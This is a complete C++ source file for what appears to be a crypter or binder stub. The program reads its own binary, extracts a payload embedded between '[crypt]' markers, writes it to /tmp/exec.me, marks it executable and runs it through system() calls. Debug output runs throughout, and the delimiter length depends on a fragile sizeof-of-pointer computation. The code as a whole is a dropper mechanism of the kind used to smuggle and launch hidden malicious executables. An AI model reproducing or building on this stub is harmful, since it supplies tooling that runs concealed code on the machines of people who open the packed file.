#include <iostream>
#include <fstream>
#include <string>
#include <sstream>

int main(int argc, char* argv[]) {

    const char* appPath = argv[0];

    const char* delimeter = "[crypt]";

    std::ifstream meFile(appPath, std::ios::in | std::ios::binary);
    std::stringstream me;

    if(meFile.is_open()) {
        me << meFile.rdbuf();
        std::size_t search = me.str().find(delimeter);
        search = me.str().find(delimeter, search + 1);

        if(search != std::string::npos) {
            std::cout << "found stub" << std::endl;
            const size_t firstPos = search;
            const size_t secondPos = me.str().find("[crypt]", firstPos + 1);

            const size_t payloadFirst = firstPos + sizeof(delimeter) / sizeof(char) - sizeof(char);

            const size_t payloadSecond = secondPos - sizeof(char);
            std::cout << me.str().at(payloadSecond +1) << std::endl;
            const size_t payloadSize = sizeof(char) * (payloadSecond - payloadFirst);

            std::cout << "payload size: " << payloadSize << std::endl;

            const std::string substring = me.str().substr(payloadFirst, payloadSize);
            std::cout << "=== payload ===" << std::endl;
            std::cout << substring << std::endl;

            std::ofstream outfile("/tmp/exec.me", std::ios::out | std::ios::binary);

            if(outfile.is_open()) {
                outfile << substring;
                outfile.close();
                system("chmod +x /tmp/exec.me");

                std::cout << "=== executing paylaod ===" << std::endl << std::endl;
                system("/tmp/exec.me");
            }

        } else {
            std::cout << "Stub not prepared!!" << std::endl;
        }
    }

    return 0;
}